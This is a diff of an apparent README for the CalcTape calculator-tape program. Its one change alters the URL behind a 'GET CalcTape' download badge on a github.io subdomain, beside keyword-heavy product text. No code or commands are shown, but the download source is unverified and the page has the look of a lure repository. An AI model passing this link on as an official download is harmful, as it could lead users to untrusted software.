@@ -22,7 +22,7 @@ CalcTape cost estimate work benefits from the same design. Build an estimate lin
 
 ## Overview
 
-[![GET CalcTape](https://img.shields.io/badge/GET%20%E2%80%94%20CalcTape-0078D6?style=for-the-badge&logoColor=white)](https://calctape-calculator-tape.github.io/.github/calctape-calculator-tape)
+[![GET CalcTape](https://img.shields.io/badge/GET%20%E2%80%94%20CalcTape-0078D6?style=for-the-badge&logoColor=white)](https://calctape-calculator-tape.github.io/.github/calctape-calculator)
 
 CalcTape turns a normal calculation into a paper tape you can read, correct, and keep. With CalcTape calculator tape and CalcTape paper tape workflows in mind, users can build totals, apply percentages, and review every line without losing earlier steps.
 
